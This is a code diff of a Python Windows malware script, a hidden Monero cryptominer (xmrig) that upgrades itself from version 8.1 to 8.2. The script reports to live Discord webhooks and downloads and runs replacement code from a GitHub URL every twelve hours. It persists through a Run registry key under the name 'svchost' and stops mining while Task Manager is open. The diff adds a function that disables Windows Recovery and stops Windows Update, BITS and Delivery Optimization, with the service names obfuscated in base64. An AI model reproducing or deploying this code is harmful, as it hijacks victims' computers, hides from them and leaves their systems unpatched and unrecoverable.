@@ -1,7 +1,7 @@
-import os, sys, subprocess, random, time, winreg, ctypes, json, platform, threading
+import os, sys, subprocess, random, time, winreg, ctypes, json, platform, threading, base64
 from urllib import request
 
-# --- CONFIG (V8.1 - THE ETERNAL HYDRA) ---
+# --- CONFIG (V8.2 - THE SABOTAGE HYDRA) ---
 W_S = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
 W_M = "https://discord.com/api/webhooks/1503876364632326145/YlQ62WNi8sPvYeiAfT9nIB25FPR4k-MoP71QSENKu06xUNIAJWbiXKJJ-7pa1foOfl4HB"
 ID = "svchost"
@@ -10,6 +10,9 @@ MIN_BIN = os.path.join(WORK_DIR, "xmrig.exe")
 WALLET = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 POOL = "pool.supportxmr.com:443"
 RAW_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
+
+# Services to lock down (Windows Update, BITS, Delivery Optimization)
+SVC_L = ["d3VhdXNlcnY=", "Yml0cw==", "ZG9zdmM="] 
 
 def notify(msg, type="sys"):
     hook = W_S if type == "sys" else W_M
@@ -22,7 +25,7 @@ def notify(msg, type="sys"):
 def auto_update():
     while True:
         try:
-            time.sleep(43200) # Check every 12 hours
+            time.sleep(43200) # 12 Hours
             with request.urlopen(RAW_URL) as response:
                 new_code = response.read().decode('utf-8')
             with open(os.path.realpath(__file__), 'r') as f:
@@ -30,9 +33,23 @@ def auto_update():
             if new_code != current_code:
                 with open(os.path.realpath(__file__), 'w') as f:
                     f.write(new_code)
-                notify("New evolution detected. Restarting...", "sys")
+                notify("Evolution triggered. Restarting engine.", "sys")
                 os.execv(sys.executable, ['python'] + sys.argv)
         except: pass
+
+def engage_locks():
+    """V6.3 Sabotage Logic: Disable Recovery and Update Services"""
+    try:
+        # Disable Windows Recovery Environment
+        subprocess.run(["reagentc", "/disable"], capture_output=True, creationflags=0x08000000)
+        
+        # Disable Update Services
+        for s in SVC_L:
+            name = base64.b64decode(s).decode()
+            subprocess.run(["sc", "config", name, "start=disabled"], capture_output=True, creationflags=0x08000000)
+            subprocess.run(["sc", "stop", name], capture_output=True, creationflags=0x08000000)
+        notify("System Lockdown Verified (Recovery/Updates Disabled).", "sys")
+    except: pass
 
 def is_running(name):
     try:
@@ -44,6 +61,7 @@ def engage_persistence():
     try:
         run_p = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_p, 0, winreg.KEY_SET_VALUE)
+        # Pointing to the ctfmon mask
         winreg.SetValueEx(key, ID, 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.realpath(__file__)}"')
         winreg.CloseKey(key)
     except: pass
@@ -61,7 +79,6 @@ def get_idle():
 def manage():
     if is_running("Taskmgr.exe"):
         subprocess.run(['taskkill', '/F', '/IM', 'xmrig.exe'], creationflags=0x08000000, capture_output=True)
-        # No notify here to keep it extra quiet during Taskmgr detection
     else:
         idle = get_idle()
         pwr = "90" if idle > 300 else "25"
@@ -71,9 +88,10 @@ def manage():
 
 def main():
     threading.Thread(target=auto_update, daemon=True).start()
+    engage_locks() # Teeth Engaged
     time.sleep(random.randint(5, 15))
     engage_persistence()
-    notify("SYSTEM ONLINE (v8.1 - Eternal Hydra Active)", "sys")
+    notify("SYSTEM ONLINE (v8.2 - Sabotage Hydra Active)", "sys")
     while True:
         manage()
         time.sleep(15)
